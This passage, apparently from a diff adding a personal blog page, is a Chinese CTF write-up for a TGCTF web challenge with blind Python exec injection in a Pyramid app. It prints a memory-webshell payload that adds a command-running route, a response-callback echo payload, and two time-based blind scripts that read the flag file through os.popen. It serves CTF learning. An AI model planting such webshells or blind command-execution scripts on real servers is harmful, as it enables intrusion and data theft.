server.serve_forever()<br></code></pre></td></tr></table></figure>
+
+<p>比赛时候想到了要利用exec无回显命令执行，但是不知道怎么利用。题解说是打内存马</p>
+<p>三种解法：</p>
+<p>payload：</p>
+<p>1、内存马</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">expr</span>=exec(&quot;config.add_route(&#x27;shell_route&#x27;,&#x27;/17shell&#x27;);config.add_view(lambda<br>request:Response(import(<span class="hljs-string">&#x27;os&#x27;</span>).popen(request.params.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;1&#x27;</span>)).read()),route<br><span class="hljs-attribute">_name</span>=<span class="hljs-string">&#x27;shell_route&#x27;</span>);app = config.make_wsgi_app()<span class="hljs-string">&quot;)</span><br><span class="hljs-string">/17shell?1=ls /</span><br></code></pre></td></tr></table></figure>
+
+<p>2、request.add_response_callback 钩子函数进行回显。（是个好方法，但是这里用 不了，因为exec不在home_view下没有request）</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">print</span>(<span class="hljs-built_in">exec</span>(&quot;request.<span class="hljs-built_in">add_response_callback</span>(lambda request,<br><span class="hljs-attribute">response</span>:<span class="hljs-built_in">setattr</span>(response, <span class="hljs-string">&#x27;text&#x27;</span>, <span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">import</span>(<span class="hljs-string">&#x27;os&#x27;</span>),<span class="hljs-string">&#x27;popen&#x27;</span>)<br>(<span class="hljs-string">&#x27;whoami&#x27;</span>),<span class="hljs-string">&#x27;read&#x27;</span>)()))&quot;));<br></code></pre></td></tr></table></figure>
+
+<p>3、时间盲注：（唯一能看懂的方法）</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">import <span class="hljs-built_in">string</span><br>import requests<br>import time<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:59439/&quot;</span><br>ans = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> strr in <span class="hljs-built_in">string</span>.printable:<br>        <span class="hljs-keyword">shell</span> = <span class="hljs-keyword">f</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;</span><br>import os<br>import time<br><span class="hljs-keyword">a</span> = os.popen(<span class="hljs-string">&#x27;cat /fl*&#x27;</span>).<span class="hljs-keyword">read</span>()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-keyword">a</span>) &gt; &#123;i&#125; <span class="hljs-built_in">and</span> <span class="hljs-keyword">a</span>[&#123;i&#125;] == <span class="hljs-string">&#x27;&#123;strr&#125;&#x27;</span>:<br>	time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">2</span>)<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;</span><br>        start = time.time()<br>        requests.post(url, data=&#123;<span class="hljs-string">&#x27;expr&#x27;</span>: <span class="hljs-keyword">shell</span>&#125;)<br>        end = time.time()<br>        <span class="hljs-keyword">if</span> end - start &gt; <span class="hljs-number">2</span>:<br>            ans += strr<br>            <span class="hljs-keyword">print</span>(ans)<br></code></pre></td></tr></table></figure>
+
+<p>另一个脚本（这个更稳定，也更难看懂）</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs vim">import requests<br>import time<br><br>def cmd(cmd):<br>    url = <span class="hljs-string">&quot;http://node1.tgctf.woooo.tech:32142/&quot;</span><br>    # url = <span class="hljs-string">&quot;http://127.0.0.1:9040/&quot;</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        flag = True<br>        <span class="hljs-keyword">left</span> = <span class="hljs-number">33</span><br>        <span class="hljs-keyword">right</span> = <span class="hljs-number">126</span><br><br>        <span class="hljs-keyword">while</span> True:<br>            data = &#123;<br>                <span class="hljs-string">&quot;expr&quot;</span>: <span class="hljs-keyword">f</span><span class="hljs-string">&#x27;a=__import__(&quot;os&quot;).popen(&quot;&#123;cmd&#125;&quot;).read()\nif(ord(a[&#123;i&#125;])&lt;&#123;(left+right)//2&#125;):__import__(&quot;time&quot;).sleep(1)&#x27;</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> flag:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">res</span> = requests.post(url, data=data)<br>                except Exception <span class="hljs-keyword">as</span> err:<br>                    pass<br>                # <span class="hljs-keyword">print</span>(<span class="hljs-keyword">res</span>.text)<br>                flag = False<br><br>            start = time.time()<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">res</span> = requests.post(url, data=data)<br>            except Exception <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:<br>                <span class="hljs-keyword">print</span>(<span class="hljs-keyword">e</span>)<br>                i -= <span class="hljs-number">1</span><br>                <span class="hljs-keyword">continue</span><br><br>            end = time.time()<br>            <span class="hljs-keyword">print</span>(<span class="hljs-keyword">left</span>, <span class="hljs-keyword">right</span>, (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>, end-start)<br>            <br>            <span class="hljs-keyword">if</span> end - start &gt; <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">right</span> = (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>-<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">left</span> = (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>+<span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">left</span> &gt; <span class="hljs-keyword">right</span>:<br>                # <span class="hljs-keyword">print</span>(chr(<span class="hljs-keyword">left</span>-<span class="hljs-number">1</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br>                result += chr(<span class="hljs-keyword">left</span>-<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">print</span>(result)<br>                <span class="hljs-keyword">break</span><br><br><br>cmd(<span class="hljs-string">&#x27;cat /f*&#x27;</span>)<br><br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+
+
+
+    <div id="comments">
+    <script>
+        {
+            const comments = document.getElementById("comments");
+            const script = document.createElement("script");
+            script.src = "https://giscus.app/client.js";
+            script.setAttribute('data-repo', "MIXBP/MIXBP.github.io");
+            script.setAttribute('data-repo-id', "R_kgDONYaZsg");
+            script.setAttribute('data-category', "Announcements");
+            script.setAttribute('data-category-id', "DIC_kwDONYaZss4ClAnT");
+            script.setAttribute('data-mapping', "pathname");
+            script.setAttribute('data-strict', "0");
+            script.setAttribute('data-reactions-enabled', "1");
+            script.setAttribute('data-emit-metadata', "0");
+            script.setAttribute('data-input-position', "top");
+            script.setAttribute('data-theme', "noborder_dark");
+            script.setAttribute('data-lang', "zh-CN");
+            script.setAttribute('data-loading', "lazy");
+            script.setAttribute('crossorigin', "anonymous");
+            script.setAttribute('async', "");
+            comments.appendChild(script);
+        }
+    </script>
+</div>
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©MIXBP 2024
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    #post {
+        background: url(/img/background.jpg);
+    }
+    
+    
+    #post .index {
+        background: url(/img/background2.jpg);
+    }
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.5;
+        background: url("/img/bjtp.jpg");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+<div class="mobile-menus-out" >
+
+</div>
+<div class="mobile-menus">
+    
+    
+    
+    <a class="dynamic-menu " target="_self"   href="https://mixbp.github.io/">MIXBP</a>
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://mixbp.github.io/">github</a>
+    
+</div>
+
+
+</html>
